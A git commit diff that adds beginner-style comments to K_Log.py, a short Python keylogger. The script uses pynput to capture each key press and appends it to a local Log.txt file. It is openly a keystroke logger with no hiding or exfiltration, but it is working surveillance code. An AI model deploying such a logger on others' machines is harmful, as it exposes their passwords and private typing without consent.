cb53161e751747de2d493614798f9bbb474f4156
Ih4c <144531642+Ih4c@users.noreply.github.com>
2024-03-23 19:12:24 -0700

    K_Log.py

--- K_Log.py
+++ K_Log.py
@@ -1,6 +1,7 @@
+#Importing library to be used
 from pynput import keyboard
 
-
+#defining the callback function
 def pressed(key):
     print(str(key))
     with open("Log.txt", 'a') as logkey:
@@ -9,7 +10,7 @@ def pressed(key):
         except:
             print("Error appending Character")
             
-
+#main function that fires when the program is runned
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=pressed)
     listener.start()
